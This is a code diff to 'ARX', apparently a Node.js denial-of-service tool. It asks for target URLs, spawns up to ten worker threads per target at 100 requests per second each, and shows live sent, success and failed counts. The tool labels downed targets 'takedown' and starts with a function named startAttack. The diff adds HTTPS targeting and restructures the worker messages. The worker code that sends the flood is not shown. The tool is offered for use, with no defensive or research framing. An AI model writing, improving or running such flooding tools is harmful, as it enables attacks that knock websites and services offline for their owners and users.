@@ -4,6 +4,7 @@ const { Worker } = require('worker_threads');
 const os = require('os');
 const chalk = require('chalk');
 const http = require('http');
+const https = require('https');
 
 console.clear();
 console.log(chalk.greenBright.bold('Selamat datang di ARX - Advanced Request eXecutor [AutoScale]'));
@@ -20,10 +21,11 @@ function askURL(index = 0) {
       if (targets.length === 0) return askURL(index);
       return askCommand();
     }
-    const isLive = await testTarget(url.trim());
-    targets.push(url.trim());
-    statuses[url.trim()] = isLive ? 'live' : 'down';
-    stats[url.trim()] = { sent: 0, success: 0, failed: 0 };
+    const cleanUrl = url.trim();
+    const isLive = await testTarget(cleanUrl);
+    targets.push(cleanUrl);
+    statuses[cleanUrl] = isLive ? 'live' : 'takedown';
+    stats[cleanUrl] = { sent: 0, success: 0, failed: 0 };
     askURL(index + 1);
   });
 }
@@ -40,7 +42,8 @@ function askCommand() {
 
 function testTarget(url) {
   return new Promise(resolve => {
-    const req = http.get(url, { timeout: 5000 }, res => {
+    const lib = url.startsWith('https') ? https : http;
+    const req = lib.get(url, { timeout: 5000 }, res => {
       res.resume();
       resolve(true);
     });
@@ -58,17 +61,24 @@ function startAttack() {
     const cpuCount = os.cpus().length;
     const threads = Math.min(10, cpuCount);
     const rps = 100;
+
     for (let j = 0; j < threads; j++) {
-      const worker = new Worker('./worker.js');
-      worker.postMessage({ url, rps });
-      worker.on('message', ({ sent, success, failed }) => {
-        stats[url].sent += sent;
-        stats[url].success += success;
-        stats[url].failed += failed;
+      const worker = new Worker('./worker.js', {
+        workerData: { target: url, rps }
       });
+
+      worker.on('message', ({ type, sent, success, failed }) => {
+        if (type === 'stats') {
+          stats[url].sent += sent;
+          stats[url].success += success;
+          stats[url].failed += failed;
+        }
+      });
+
       workers.push(worker);
     }
   });
+
   displayStats();
   listenCommand();
 }
@@ -78,9 +88,12 @@ function displayStats() {
     readline.cursorTo(process.stdout, 0, 2);
     targets.forEach((url, i) => {
       const s = stats[url];
-      const status = statuses[url] === 'live' ? chalk.greenBright('live') : chalk.redBright('takedown');
+      const statusText = statuses[url] === 'live'
+        ? chalk.greenBright('live')
+        : chalk.redBright('takedown');
+
       readline.clearLine(process.stdout, 0);
-      process.stdout.write(`[STATS #${i}] ${chalk.yellow('Sent')}: ${s.sent} | ${chalk.green('Success')}: ${s.success} | ${chalk.red('Failed')}: ${s.failed} | ${chalk.cyan('Target')}: ${url} | ${status}\n`);
+      process.stdout.write(`[STATS #${i}] ${chalk.yellow('Sent')}: ${s.sent} | ${chalk.green('Success')}: ${s.success} | ${chalk.red('Failed')}: ${s.failed} | ${chalk.cyan('Target')}: ${url} | Status: ${statusText}\n`);
     });
     readline.moveCursor(process.stdout, 0, 1);
     readline.clearLine(process.stdout, 0);
